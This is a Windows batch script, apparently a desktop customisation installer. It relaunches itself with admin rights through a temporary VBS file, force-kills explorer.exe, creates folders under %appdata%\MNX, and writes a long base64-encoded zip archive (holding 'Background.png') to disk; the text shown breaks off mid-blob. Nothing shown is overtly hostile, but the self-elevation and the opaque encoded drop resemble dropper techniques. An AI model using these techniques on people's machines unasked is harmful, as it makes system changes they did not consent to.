@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    rem del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
pushd "%CD%"
    CD /D "%~dp0"
rem 관리자 권한 얻기

taskkill /f /im explorer.exe

:MNXFolders
md %appdata%\MNX
md %appdata%\MNX\Desktop
md %appdata%\MNX\Downloads
md %appdata%\MNX\Videos
md %appdata%\MNX\Documents
md %appdata%\MNX\Music
md %appdata%\MNX\Pictures
cls

cd %appdata%\MNX
echo UEsDBBQAAAAIAJtimFXrlaba9ioAAFAuAAAOAAAAQmFja2dyb3VuZC5wbmftendQE+HbbQDFAoKggkhTVJp0pDeVptKkdyIl9FClVxsIASLSQUBBivSa0EJQQEooIj2hQwgEQgsJLZDL95u5d+b+eWfu3PvPd2Z2nt1nd3b2fZ9nz54z>x
echo +8a90te+dvXOVQAAcO3Fcw0jAODi+S7t38t05+GwUNTpPND4G2k/A1QNca2fH1xwear3FACohTJQ7M8vpUl4pWuiqSQvDxIR2btwYebqVR1paejdu1QAIJeL66ms7NqlS79ZWd0ePTqmoVGVk+tiYZlmYFCXlS3h4DigpY3h44Pcu/>>x
echo fv2rXWmzdNJCWjHj5sunkTKCbmJSzce/26jbi466NH6Tw8wfz8hlJSNezs7x48sBIXH2Ji0peWLuDkbGBj62ZhIVy8OH/lipGkpKew8If799tZWb9xcg4zMfkJCv5iZV2npzeXkCi/fbvl5s0nKipRERHtCMTq6mpDfb2dtfXvX7>>x
echo +oVOr62pqRgYGHm9uPggIMGj3y968rCPQtL6+/r+/o6MgeCDw4OEhJTg4ODOzt7X2uqTk+Pr6Kxebm5FAolMA3b0qKilpbWmI+fPAGg+dmZ9WfPt3e3t7c2KiuqnJ4/To8NBSamOjn7f3u7VtPd/fszMz9/>>x
echo f3h4WFrS8smGCwzPd3K3DwxIWFnZ6eyvHxhYWF5eXkAhQrw9x8fG0tPS+tAIlO+fJmanNzY2CgvK0tPTf0Mha6trXV3dXV1dsZ/+vTv37/oyMjsrKyhwcHzAomqy908Dx/eGOkbU///A5DxT7b9/Hmu+Dy39AcAmDr/>>x
echo a6Pp8S4976xHiBcaT02C7QizSAjnJLvgTncXP+juh8lwyM31Zz5lNR95fw/+ZquDxz25bHMYUDbx0d7+1zcqJdc/amBmpIobMx0wQcbRwR4XNgdtIf6pKEoXpukD/hv/JzjcOiWvHOSjbaO3UfkGeZTpLVplC2jeD>>x
echo +r4R7U8iuE2Rdz87GwU2Pk+KvXEoHhgC9dOGCa9fRHTrmYNoBwd2BBRoy3rBthdAWT6R6v5aoEA3vV1b9LbOiIM4APl0W5w+y7yztBghk9ZZSjnE1TGTvMwtKV3g4f0UQ3PRg3bC5uj2KTjWwRz5ZCnez806xNKDagGiHwGKoq06xMzns>>x
echo +jFrr3eFIt9KZHoSnCEHDA/87IYCOy+qkIZb80Bq5WIiMggGQ6Aq5GEJLV8OgSUtu8AVTK5zT7ICp47N1UtUGkIFxA7dRE3WGcz4VHIuMO39qqfn66xKFLYgzgQGhJn+FliAnar7GHMARUB4RTVka4AFFxTZaQ01f3x8UDUPlS>>x
echo +6fpL2ZsyFCh9FNZgVR/AGWjr/DOXY+rh00VEcqbtxfaG9SHvzCQl9ElBKktQ/opqWZGu+SBU6Ots1ejbek0ecpJ1A0FpEWKnL0wuZ2xxusVw/6J1JOFM5L63xTtKHImyVqJVrUfgFNfkNc/>>x
echo DdG9LE1XsevDttuATUk5AEU3Fig4rLavXqPZ0lGjP1se4U1eSVshTPLg+ei+Fsx8plnFLvEWo+5qDgNcQjQibnYXDAwTvFTttg04FmwWhw0eRHewjyS9pYbeyQImPkXu7xAnP0+qbOHwfM6gMtjAkZdzNMuNfOWjiOQLWqdw5>>x
echo +iiuSMux5WoqPEwwEF50WsoH0/jqE8I/FOslihgomc5GJZ39qjAiRmaYhXae+M+XRsHYGMr6pNT/UVUL/XPDOvC2ZjjQr40M0RE5B16ed1pPphpZ1KIjlKuqmqr8qLzStu0QVQas5XBU>>x
echo +9kmrOJLVxjxg7qph47iXamfF56KXV4fvxGmEHJBU/lS7fjLBmiScPa/77uz94BqEemhyruHrT7R6PqY5HzTcG0PkC+SyeLsdlQENfJ9/CE6iYS18IwwWZ2SV0U/pXOk6+DNFab7yjCcz4PS35+Wlo01w+N9m4f4rIHNbMPMMtHnnN7wj4QR>>x
echo +gxi7sGihczaz1MI8tCg1kkLPXv5oPBKpfkj6eFnixAQvZX3Fp3cu7hDc84fAL2FTpYS1cviE7oNqMHGXd6SkQVtfBTsie1UaGKKhFG3iXICzSHzJRjp6sgAxzdRA1F5/PxE+qjZNAzOef33VC1/>>x
echo dAY5utasEkDWtWtDMXzyQcAh7z9ndksbdV+X4tSOQIpXvDCAai3kxzuW5GnAoh8z6mZOg9i/eO0z1/MtO9kuMJ2azKNlkdxF+tCu0qug4lTADEtUS0yX61zrxNokKd8JlmN1+c1OlvMWE8Zgt6vO21OcFSbFCedgBOiLCOM22X5VybtRXX>>x
echo +JMWwnhc46kTnEDTUs7TweOyDBLVGlL2fGgCBCb8bh4pWiLLCec+OH5pT94I52KmfojPyjz2ysMPNDSJCdBf>>x
echo +dwaJNqiZswEmwqnoyHqrykBxzL9c05PuXG4xMczs2thid8g2607ilHaNFSLHm4qoH4ekpEDAiWxB5gT2IBbRfNqFe2xVBhjaHVOliiE0Qgo+v0qYD7rxk1y+8SkixyV2vEpk3rCR>>x
echo +pZ0HWAwBCsCbsNRr9Sg7m3MY5lZGyU0gpy2KijqBrrOgdT3E1R+j5VQHmF9MbxiFm/Zar4akvXNN0zw0VnuoDA0+GCDgKfoif3nbhmt9wBayCoM4kD+K5RGGgbMRaK+Sk4avPVFtCSdSMqXg22DLHKjhjjekbwaE3PqUZp/L6o>>x
echo +exAho6Ljm2rFZzIzp1kGs65EgZ2isZ93k8oQvBtE5o/QQoB87kQ4dGC1WI/MQnbvD26xQD7aVj5ytQ04HBhZH2w+7HGm0WFPltclVmmXtsaZJO+IOva/Z4rOMe0z8g4KbWeMJjSsnnzNA>>x
echo +YNx5HsA2avasj4uwej9xC3iyFtsxnhR9L7q11hWTevq3bnjEc+9+LjFMIBTgjIGzf8QszwXmUIgVbm3EjIGDiL5qxT8/NsPUqhdg4sdvKic7YeYgr1L5GhG8D3n/zG4la9VegSnh/7xLLzFEBQCcYRq7Ng>>x
echo +mAL7girlXsu0d5JnK3XaWqc3Mbro4YA1Xx3GtvbLSvF0S86LfK1f5He5tGkQwY2blcO682H0gffX6ZXFeR3iSmKbJAFRY9uJq7ddvhu05dwdCslpBE97sFx0gnT3azvlCUW4rb54qa9AwPqtuGWBam2wPFhqiYJgQ6vGaIK1ljlemPoBHLA>>x
echo Ynbt/SfD84jMR1zxjzuzSc4HqyvXH8KLXlf1BdppqyC+WDAaGziQQlLjWZtxc1N3LrC3WgFXfDdGNBNnQ2941K9h9hZMwBgHeJb/>>x
echo n2DougtOah1SC76EUaEbMMUEyVUxY7HJvtXd8pTZYmzGro2KOErhQzkKnR7ihPfjjpOdcQSTpiG3WsPTHecnt/WX1u6uPN9EcfwLl9Go4Q6qCf7nraq98xm8F9CaqzpBLrvYnpl8+hrv2VpmfoncipL/Nlsl60stG/hC+ey/>>x
echo yhPCeYOkN1NRtXFaUJQu7g9LdS88vgOEK2CYQfATP9F9PWiCpn6noIKZPNvPGBkOYzNvOXGdX/+mXF1gSw4k/n8FZn0FAlE4PGrqxYyQtKyiYUHvblVBgeCbwDeX2+JzsZdeFayNAG5lzWhu63zFaOeLWyWZfWn3NBQb5HjtpTSRH/>>x
echo o8r464VPCh7/aZL9jguXjMVD1S5BflT+/Yomp5Z4SkchaoprqAfPszHBOw7qTRIWgmqzIm10fClxGaCQswnGt7KT0z+kyZzmhFjECJ+uGq8CvGpFLZaqua+GULNlgbyiayGpkFcyGx/lLle2by+KGsKCBdCEgHLIcNjkG+mgzj2+/>>x
echo rcYwHS5ucD5DNw8GcdL2RuwxGYBqJbv6SWeFvYPVZVFNaqsvsYYRiWZNpg/KlQ0/95oJVzUa9wf2XyXqeSuffJYv0/CGaGFYw2wSH28TunOGlthZXa9H3uiqXbhv8aXJDekU8liIZDa+L5aAvSff3UBX0i96hyH5NA7QI/>>x
echo 5H34WrBo0OgYqz/ze8NMgt1pgzMs8Vd0UfqXpJuKBTC5V03bOibnueN5Ar9aJg9Q7QA4Y6bynrQmu/dVbvZlp6/ZmXVUHX4aGmB8j7Ma9p2jOJR5iP4Rc7e8IVshWwTzBXt7yzvXy62muf0y4Z7yNrJFQKJP/>>x
echo kdVkU72Qhxh3yZGf9aZ4OZ1ed4HXdt97mnklO0oaH3rtG+xyd+7+PG1DNlU0PbFhGODSfr9ysjvQ3XQ0sdYaWix1a0QHDQnPPFRgtPozl+sVX+nvtFMnAVbVR6B52p/u5NsPBM4K0m/YTTEI3P2R4/ULK5+B/>>x
echo e8FoQqiDeoqLng3pj1muyVf8qB6Ofu6gmYECv+GosXyUN5KWfVMZYY+MPeHmmcF8YQsDyl0mQ/pS9b2mT+ZtlYR+wJqKltRQm2Gf7wGCXeq+cu4o2I6dXNT>>x
echo +RY2H12NZgLD3pvq13199fvPfvzWKnW2CQrTrZPVenmMWkSDjrw0mPWUE4KIIAsg1rmsIu7rVDI91f2HOUvCEqvLskCr0++njwOBfbhgGx>>x
echo +meOvr15pJlKQBHIa3XeXKWiG95xIF0qv2w1rsVONz8j5OxA1kAokeP1mkDXM0xnwZdCZYG9xnved6wC7EKNbqQKYcuDirtrlzIQBSB6eduLXn1DFmBDaYSuo0HQdF5kesDLY77lMCWX6BAa+d9//>>x
echo q56IS57nGYG8BwWPPghSRsxfvZKzGhMS0y7+FqQgqXCJMsghFp48eFjMmBib2Yv41mrHOjnw+aQXQ/0r8dtxI4r0eG3/PzYRK1vGzcq0A1w7FLeZDxyn8vAu50G7rCfD9lT/mKdhCiPaWvvsL6+XYbCNO0W5jJ/tV+K1K7/MIjUtuxl>>x
echo +UKXiF5AF+wOn6y+/JO3QvEqv/82PkLvvFlK4r2GAdasMmbWaStinKYGjLCtgRfAhC53FfGV5NCE34O6wZOBJoN61o/98E/ATxuKmeyFOBNvS3ekjPr5Ksjl9jSonhpWrdT4WufBJlCby8fHoJX6jRQ/>>x
echo fM3m3exQCpdoPkvw2mo9eZdPLGXbtPVlrfwlC9YmdYWZOAVD88b97wIsBLIW/RRbLAQVogQM2LI7qPiOiwenuJpb5gqZzDE5HDeGuV2NLnqICq80Z+XbashzAhYPPJTLY+uZ0LuFEKDzPOUpF3X3y+DlaRNMG8QBwv6x7zq9PIJhf60d>>x
echo +642ICMlTbLBm4lTSSyRL8dfHoVcRqELGWuC2Rfl/jWfOf1ZW1WX1Cdcb0rSKJcVlsd0zS0hFl7NbSUFSlzbHsRd5qmDrO8IO/vw3wvBVNNCj3R108BZPrsO1ZLSsr1KpzNmqAuxr1KKu+1syyNrp78rs+5>>x
echo +022PxNTFTdU5s2vLxGKz3bIn05WtN7+bsxbnrcy2tAziLCo02W4dbCB6cIAN9JrB7MYrsGlKa2lZIEWL3oK3nCFHtnjkwJ53MaBZK+oL78TP1WLCH0/fIfX67YemDODLsYwSvLkxrTYNmXkDXPsWXjQ1W0UHUl9Os>>x
echo +238CWXoIESMu4tdMD3ciRjBiG/6L2qeemOM/75Lge9q8XyPqVwFfcB/+/6P92zWRAteVeSoswMDR4RMEwOfmmixal1BvvdQIebEBnDqoFNM4lA+Z7C5i/>>x
echo fBabJeWupIaqgaEi844nUcxRjDVYLsVaALgCF1rZAh0cUOq47mqOb8vJiLKSTQpUWYUPCVXuQW8Qxe4IZ51mxwA9fT07sSdhTzt+FjD63t9aXosorocZR6FBxRwVe6NDYHA/hLo+XwfESh5tozCV3bv+Wtm/qeXeGDTq1Vk3O6O8XL+1/>>x
echo nzMRvxEzJcFg21ggyS62p/gnQME2FUhVDhewNTuu8Ew3FiwfxBN3nysEYje+OyzylRh4oovPNGHL+9c5nT6KF8Qcl3A7JrvbpISJtSpiKvtDyjZtIKHqD+3xL8iSUh2CllDb+x/SHwRb+sqqqBEpLbZ7FQW6Jjya1hTO8srA5qdeFrQTG/>>x
echo KKEew5Wkj8cUEeMKGKPMwG1GyrmLb6xPNYgdXwaeCjbFic8/5i9V7nu4cXugunp1Dd1/9kulw67k3oRIRL+TMyWy4V0DeFH+NT6jbcPCFjoEvTO4UCKs9WxFot6avkrvL8CJ6NCW9Ol0/fq279nfM8qB8cUmFxcPjGby/>>x
echo IjuoRZXaLeYWDhIrQTd8Iqkw/qxOPupMOqWyBE2DKdu7TtlqV1eL+JMqLTM8ukuXQoJ29R4/Nj5wJp+Jbds5NVznMpTY1lYBfRR9xhBpd+kY1tIgbKt+4A/ljm8Zjh0iYOZd6K+P8cr3IWxsxNFexoa6wJb2+n/i8KuAETamCTa/>>x
echo B5QlTmSSt3uckIaF8xoq9kfXNeb9DY5gSvcS284AVIlyBcTEx2VI85kSYYQyNlyegLewasEbgyFQlruISWaWG8CT0/SOBIPCCrNSTdg5sp+f8h2YBSYh1RTPd/BCApmfI+myXlBMmlb/f+p+ENhr4O4ouJq/r>>x
echo +3IuCPyfDLkTNFaNmUpRGgAgc2lok2y5ouqJ5h5rfdMwu/02BsNK4+gdvX6dSGLJZLtziH3TwQ+7W4gU1F3Hxv/4hZ0rkZ7w8yiHhaekVgsJTeQcQ7qYf00v/uYdoDlYE0F+WCmITLY9dU7Z9bA60zm6JUl7N/wW+tJHAWCfQMQBCVWYR>>x
echo +IdOj1ZvNBBefeT+WLHcaNZN6XbOmiV0BMFjAA/9zqDzYRJ0F0GDlhGzAKrYEcq32KrQWyeL3/MVcPLiXvXolneFFffPq0eVEOGt57r+8ogWBA15sYRTpvavFd+G7HXXawQLk5Jk57/vqe5qeDdv96wK+fN22B74j7UC0Cxy/>>x
echo c83em8Mku9DiDmpG98Dzt7Pjar0UEKgQBHDVIjE9bLWeX+qbUbnCianwxnRfzePBLX/FOna8FjBFC2pVT1ih6/ju3kbgyTjqw+0N4AphLHH5z59JBlUvBqJ4Hm8zl>>x
echo +w3xeIki4M5IS0kod28vAekmebfV6HdP8iwIdWAIPdiqYlhcXv6pGU7vMydbV2mq6lDRQNKlntbz16PeZXP5BbqwMXSp1dzbHQKd7FxT52VFO4OLwvO2W3ZZcKysfMxb+vv+4HXSEzW1+dZr8I9MYqz8zpPknG4/>>x
echo FtVuaSG4FRk2lI3K5YRw6bKKftOt/X/84aU4iRiXTwCyVH0u8rDDDQXQqR0lDWDsP8iHeZ4SsGPnZGzGNEELSNhDUFOC33xfS/ET6Pmaf96y/hoXv8Z9OvjfmGoDXZ6FCHRYVX6pEHRTst40pNoad7s1CiK7mrUkzPffV3Xg/>>x
echo m2lvWL5ZonhOx90cOTiSom5UNknq71xT4tbXAaOGtezS8jV0QVdXGBMsuY1FnXWom30w3X3UV1529e9foUWbkWHNvJAuJ6ibrUd8KLw8dDUSiZr/yxWUk+87RF4Be544G4pp7g+stg84px2Sy07tfOatz5S3IwO4AxDrybWKaA/>>x
echo wQX3dJMXiuVZxWy7ZRNXhMJBYR4l3EpXfdGj+TMea85Wbl9ZlRLXFTRfuqGvFaD1xgwqswBvMpuW5tOps9gdmyEEpiSik9cDXvV63J+nDz72o5O6/cXhLp2hHCmdeeaHvO2/>>x
echo 0Vxoy8OOsrkDJnreYg9imwzPwxnt2bIkknioJzOs5PrbmMBQsi4s25TdtLp7hEebEQSfbf8p8/FQBqqqSvuQu43KNhc7hOO22nxmUP6y5JeUv7es4XpmdRsaaxvZNgiVC4voRppT6IAzj4R2kledWrQ4QOSlDXpyJZA6f6d599pOQ7h>>x
echo +Nkjn94OF+DVmZ1yk8p1qcp1340mDeqbXk851ElITMxY5RtldhH0/dEgjuDGyicQ6jz4vN1qQccQ5fFzDnDk/>>x
echo yLT53scIq90FsQKvxkubRRXQLFsL5cem2uHSW3oUEzWQLYYFcdCp64lNdnFCIjTqDpgDhDbpuxmbjpoZ1rb13iaF2yBp41s9vFxpmq1XDY4QuhNjOtPigFDpk7+o5RY8abSosoV8N/20Oz88MjQw19BgMxMUQfsyHrOt96GvJ/OkDk/>>x
echo 1tbjsSGjgWx+8ewj4d8ahlc1BefycxR19nnEvMVt/4Ib+WylU8c3qWlG5RpiTk2W7wn7IBxLF6gF83tRPq3mXkabjXtTwLm57zzsD2>>x
echo +4ENkcec8Kw3TNfCeRg6t2uG2cJyMbn1p67VpsMuGHT37RnVu3LSHbst3mKk2fReEy23MhdkgmGRwKmdWxAl4+I51Ybysp9EJyxnqUBmE3JdpXwT3E+yNb2LT/W2FXcGs6U6Qt55ljgurHc2hlghQo78zJnH/>>x
echo hW88rJ61nEPdUAklmf37XcVobH3zDGelupAL3iPeUQJW+OFEgFVfzrHk4jpAwinSw3ezuOL9LZMBpRsRXL8BQvket/bz0+MFpHqwMWC8zo5q06cbxEVOtD1vql81K/0gZshtkB0bm1ZZdW5WFa926PSem6Bu3ZB>>x
echo +995RMVbzMiTPVfafUcVOkJWB0ou3mcvNXTSv9pZSVMT8fv+S2W1aWdhKbXU/mNLsbx0hjT/wcaYQMo4xEDUtRh7j66tGZ4y+bBmLEst50ARpqSEyWAf19gUbP3U6JhukcBgvHAH+m1e601IGoZUq7v8r9hEkWnTF/>>x
echo BVq2IGnBFQklrtDM7qT+vOoTMcHfx+Q53oUWvLW9DtCI7C9RRemv8mRJdwxdSL+Nsnn0nyBv79MhYlOZzF3GT1vVe9aqKooLb3lXHaev93Li79VrDMfi4ck8Px2torC2gQ/qfeY3wjeyiBLQycM9kc1TCJF6SzeeM6M//>>x
echo 4bmdvg3N3INagMmfxS5hGvvxLaC0PfaDvBZWEqZktzxDOaPSOAp0nnZ9yHtwlWgaglaw8JYoQKs9pQf4s2iFk6+t0fygXiOBLWxP4W/yi6RPQfyJ5YwNmWJqedCXYci9TM7mwqG4a5i1LkN3eZygSvaEsJicK/yDgTeSadGhVD3mwZJ41>>x
echo +976IJuTNOaZfJU7V9V6y8EmeGKefvUym5K4ksWqWafpQjZAbIODHqYshR2ofY/eqtOz5L5WvVvl0kt8IvKffmd6W2/haUNuctXs9XXX7tnRy0n5ohrGTNSNi9ul4hHkF5/5WD+sv6qszr/a/cEjxU3ki8x4yLQGd0C9EMFNZv/>>x
echo u39UN32a3MvLNcpd3y3P4cyXzIum45Fn85avbGA+9H6qpNGJKbx7fBQmo00+hxIS56JXI1tvc49LXPMlvWj7fYN7XqIY32P5p9mWSEK4I81QJA9JPefwkWLypHDP9s24ZecAXXq/PzMJahbZszOTbLUPijaUnuihTlPnQoEY0AvW+ZiaQ>>x
echo +wZCbyjnY7Hu/YLBqnCc0c1pZGbgqK4AMsn905Ww5AzJKh2zNNHbKCw20QXU+okZWy3ClyGUPyka5nGtrfcbR44Wn/zHNnevGb9qluoYhNlw/>>x
echo UHzG5g1QeoqtNVCTMPRATVKCmxf5VTAWnLMLb7yQ5QbPkIOlMdijQyab1ALiKMdfz6p5JwFF9qN6I2U9gIcbdzFQmS7B7g+/6vRHO43zgwKFYg3l0wgQZFBR21/nB29n3GWBO/Lx8V4a/8Q0czhiMKBUITUICcpObXMKP1bsfCAuj>>x
echo +bNpVVcs3rpnbemQyaP92GKLnMoGSQXndLbg4zanY1CNttkhQSfrrVZKN70DJz5ww2m37tpUzR23O9GHDt4Qkxj68IOuVBpWsZePfsaMpR0N55rnvkmVAkaW/8iGJakuPaSbKMKXTTmzD2rI6RneWaIkCOM>>x
echo +76H1rCH3uVrYTatLeHTtMXcBGYVJTwGpCW3WKWlxdET/oWWtaseEsSGa9vddvrDmyNrHspEtjax+y2rc5G9G7RbDO8WfTgFjhU/JrH7PJja7S8u0fhv85OSVgRXyBP9tOSboQ/>>x
echo ZMKKk5HRkKO6Z1sBNsehjISkzsn1pR3EkdU5gTCddAelzBSqnzI+J3WTQ3v+BEbFMUqQcehLM/kQ8eSemethYHMFpFinay74hIQJu3nif/X6lo4dnrKXXz+4UQSMrKbOyVuRHLZOY0qoq9M0//>>x
echo PX1CphMmfdgKp2F3ngRMGnUaf2BGKoH0FIB5GzcW2T0KPavNPF7oxDYgvUx+U9/Xw85Vk59JAuqZ6y9AVyxJBBdcwYWVPKQo1Uj/4EYlG2qkuDCxGhR5oqR9O/Y3dPeINkXcP18Bk3ijCR/>>x
echo ZvIjPmJxwiJ4VCRfnaPEz7S6T0ko3uj6HxSWl3XYz2d3aiURqerjyOTJyrJWEyuLMnAooSFAPQIt4jEnlxCnH4Aqy2QZgewc9VnKftRB/mHhxoIcxZCv/So9+g0LKJ5IWoriT6xWueMLaoNADyLOJNARoryz>>x
echo +7fiMtZ12GcKCceVwbmjJtqteOqHXkar2e+6L45MDmKH95fvS/V4apBQXoP2mz3G/iusKem82s1nK2peSGactRu25119LhsnMZnPF//tS86nl964D7bLi3hhXvSwhFZtqIWoP3+jzm/>>x
echo VPoebYL5AfJF2paeN3BKD9lcXw2eZcbN8m01TiW7zTeEHoQARetUvdO6ayiO9E3WXnU/K/E3ynAG/rnbcqc7q0h/bf/mg0dWpklGywukeqmOuXJBIK0rUtShgafrXg3gMDe7fXH5rSo1Waxh>>x
echo +gvw7syz3u9zQmpeEyTvjQT2vXAJ4p403UKxC5gFQBWKUtJnDdO/YdwqEmSce+B1GPE5arEJiOogcYQenRkLd3f2Abad/h6iNWZK5438dl/NxUN13ypUP4c5LkC+GDXwynmQcQTISmCO/Cp+enOL+A9tO3zPW+NtDt>>x
echo +BTXirLrUvIRKjFzCHVAqRVtoyT9pxAUXbporHdkBCrdopgF4AUseYXv7Ma1P9n3TrZc+M037tRG9SD4cAi4/UO+SMLYjVgldRhVrBKPFlUJaNN5mGhxq+Uz/R3>>x
echo +391FkPuEnkCUoZ4DrYWBkfiY4qK8w3ruKjC78b2yHVsf3vTRLYnLV0EMb1NA97EvWJ3f1I8lv2RcI8dxSrJ3ffhLtcxC4ulj3HQGTUIKvafMPVWOGRaZSMQ5KRadQbeJ>>x
echo +Q2fKEGwpwMEpaiFC4kYE4F2JbhKNW9taMk8EtxSh4xSe8NCAP680ILgG+YFCvjcAEf/33sCROueSxS0Sa44RcuWRRKlIMKWJe7s5hOCvrJTfST/>>x
echo lV0G0H2buQm1EAB8PbS5Gvxlb3MHUSypDlLXIshLUMI7BQfIZrqQUiTP1XzcQQ8ORZpzD8sCQ31G9LxV1JDNkLyK8MHIGsPeXt+L7V4Dq+VLv8tG0IV3j2xnTb59w3qJqMOvw9zNu/>>x
echo 8OjZM2aBE9TXkpCIpi7EaRVlxb45W679caemQnEzXluS185TtVk3zGXOxtnmUet8+i11CCQQtrOvDOsjfjxaSKXZKtwFxTd62wAzUL3s2ExFMht34iv2FMEzTSzRnFdbc9KbqP2oR32xdmowcKzeqhpDwn21AvUY82Oi+A/>>x
echo 4PGxM0nbvwwZ3EKEnfOQ7iXkHiiiS4aQoRnPQF+d59nO20MV3xjbPqPf9PmVBv6FEI2GCWkDaAHmYTgMRs6spbwSvHLS/IepF3OU0iqIH3cbu5fhC9rRxAGJnzPSnvbGkgJJaU1SPF6PDh39NvJyNTN6FnerJu0cIQ+PU2/>>x
echo SJ288HSJm3T55b96OKhUvUl24Z25Ukh6al3bN7sHwPqxl2D476sA0UgY9rZwhVD47xaReLZjyU2BrWoWXZYJ+v5SIMkkqwLdoDc6zqJf7RCDmCCU6x5AxGKrarmup5kNAgCelBBB4/ik8zkapL/>>x
echo 4ljhzg0l2sqSdV8sD056gtABVnJPXsU9clB3bTItDLZEHRNfVtJfHyCGZPWhynjFHcVy+v+3lnbejkJVH9ZKkRpH7l2qpholsazP1B5Ohc2PV2vqNy6R3VIJRYn+CU9+ZDTHD4z4aJAgtythYfT6Acc4MCu403zZOrI3dWtgitg76JO/>>x
echo +So0j7ThW3jNuF/MEpCMFy0el5WjY+EX5ptQ0p05kSmI9sbq9WapsK1soI1e9qEYhEB6Q3zespnH>>x
echo +Ml6Qa060mdCh2hL8WExXjdWz8lFjzBWOcmk35M3lsdtAnYbGuXbPh1uRaf7lCvWOTfkiamESwEN84diQt1kW745vVm4pkG84dOuwwx9z2/BtvqEF/FjYI/f8LZoEGTHvm/3bajJEnnbEX>>x
echo +N0RDRqT6V2GOXz3oM521HgN2WnKc5u1ewwF0xCHrRiMh6V838uYel5hdO8mVawNdx0w5xbLrncZmf6WjqA7G9X1zttr996nv1dyLVk36piw7yYyQbQRkeTwaKmrMliOlJo7uin>>x
echo +fS3b06BGFdqSKVnK8nrgOJuAA6vv8fPOLDhmS4fmaJc2TxWDPkb32ZrzZ+lScdbwomiUFLjK5iJKwLA670JUtyNQpaR4wTad9hUWyRIet/naLoe6eSHDDbAMpc2AsMsNlNzgo4oTtPu6M3RhZcMmRXm5/>>x
echo GyQiQo0p3SL4NKME3IH3XXnfLsL26zJV6f2znrobBsk0ugd7qrVLcx0I8wz7zqcxQcdP1fX+i6MMeRrVUsvvkkwtf8/>>x
echo ah4qL4d7HAKaYVayER5jk5uqnwvWzGLVdAoZWePUJ1voTdmspx8LbHK8VgkiBvYDl6wJb23Nd5Wr8VhOq2hmlMKfLEROitK/5E4w/Cx6sOijo+tfiLXP+sQzWPVQpJb1N0nV0H/>>x
echo VlcMCw8iVJtY4QO2UNnMZFcK6tdkSpLCEW6mcM73bV5JwXVFFKlMzTwFj19WoVvm9kHN8dznT3ILDFWtsk3rBKfQLFTEq1Y9t9s6/E0sMWYG4s3Z8XT8wg9VUkhZnen77HvIfjs+xJ/TdnlcK4c3Izrm8HxlsNKzc/yhb2Tq7dpzjtLs>>x
echo +BpAKIj6o1YplFhqorhoVujFLASpuJbJXMJILSjbjvkgrvXybn0ayGW1fGDtOsMloDkSIKtsWXOlX5TgRv/BhuuRwNfhUDCK53My4If8NUA3pA6rIZDiv+FroxQ3CR8/jUy5Mxvixx0/vkhglZ0jOjNXt1jy+rz2W3weZQZc723M/>>x
echo 5UyGf2BuB6quwiqJg2999+3x9m2WJe25K0sEmkXiQZKIZQzSkxVgWOcPBfNWLObrRvFGjuUyZ7agkO/39nwOHZBrywRo5q8NGZPvHbCbCaeQsXigLQ2le4YT4fx8WSimJRZvf0oRUFWeaDZvoo4FeJMaaC9XKjFt8Vl+xcmxdj85eBRr7/>>x
echo SoofuIPOFxQ6BByyYpv/DSz/75FtvA4q5oH0HNerF9ulWU4Le2s2c21K1Ze7Ares6FZAwPDS7tboQQC2RlQAelsbm1LVH6UQb89hPuyLAjX2t8bBTN80BzO8LjvNaEi5xjumWDWgxAW/>>x
echo xKgKlDrUOGFny8oVjU777zR8Ab2l4E3j3Pc22Aw9bv9k7ZQMfs8iYfk8Ne1zrTr/>>x
echo v0reHRVODGPWBmhMDLGbTVazFiTzpkdVYtebejVT4u7zTxpdf9hn1LtTFne6JIqn3qeJBtq4TZKnckWL577KSST2IZTMc71LQnwMzQlw3FaLJpeapeC9y9wgycPuArl2HLyupdnGzXUvFCcvw21HWonJsKuw5vhbhGKqdrFhlcziIJwCbnUa>>x
echo rjodbZR17QqcXxVsZkoD6cdrDZyNzxVURwFsbecJciotEb8PdRnHPUdEgx1vy4+fk9NZPsLiN924vUo8Zf6LMW1lte6oRsq7N8wpSFtlX2dmRGqS1Rr29rAMdboplgBR/q1wKRSj5f30XNLu4GqUck0E89nYh/>>x
echo MiMgmGSa4gj2VmjZGI8qkzfa1uOHfcFqnIWthYEfzbGnVp9oYzQuCGO6H0rUtsJ3gIMSLSlgztXuseu593q9E3sxyXpYpZvGUkNQTf9k0pApATGtjNXa32ExzA9ejKvEJZGE1yj6OgBd3f7NVGajWXIr8CjYv16NKv/>>x
echo vq1lqfMtoZEmVuk6cx3UM3ua1PlDG2ey1ZL+sb1tgiYs0rrjVIXNJOtxQLzBgtVynLEjDIe1fdZ/Om8ONvV8pO3B/NP3d0QLT6iw/icZGhDMAxose9Jd1Z+8hMrDBzzVAg8dJDaHz3ZRiUcmtjSurlV9IYP90z/>>x
echo nRDF5T5pOS4lS2q7Bh2JPpBgRFUnTzbVdpwJfcFhnKB2zsD63j0GBlfznPLzJgnpKHV9Z+mXU9TVaMmNX9Q/OPmZH2dJUx4ssciFRPMFLgr/EnJMqBNrauYmMI6UpToFzX0Z0+BdQTvlxOZYB9f>>x
echo +ylvTK5oDW8SlBzhWSkMTVPaFX83E0YvOcDNk6247204OvKNcGzNM/82eG+UktCDAgdEpIv/3KO1nGT3H5dNapZHLOPy7Sthxh1Hf5dwqetMRJYJWOw794gszDCvY8LBrgQ3BzLb2R499kJ2jBxkZ1gZhmq4N/>>x
echo ZdsNOHJFUYGDzdojpOane4p8MWALhfoqcQL0mtH2rKMJbcyhD35S7DY+ZmNj7bY/MTGwXW0ie6RYZ8uJon9ktA9io9Jb5BYCIqYgwWETSWvCdwO8THUvuxeGkGZi845EvgdOdkRnPo7otMt1QPU23spKPK4jg/>>x
echo 5vp2OTikVKnRuaFSZwPjuM3Z9Tg8MKrMaxpZW4z9BnaK1kV3T3IGiqpTLqnBMEv3UT4Q22vC+UJUG9pDkxLcMsvO5ngw13EyOd8wBj++VP883zPopP5y+F/7tgHFNWTQrhB63nuH42x2qtGbH6DaFxli6eOXWYWIbBsWUidt/zlXHJG/>>x
echo rx0Gs2vn+yx7mCCVGA4fhKQRpJkCQl7tlTW4sPyvBUQLrTWHV2/8v1js+N/>>x
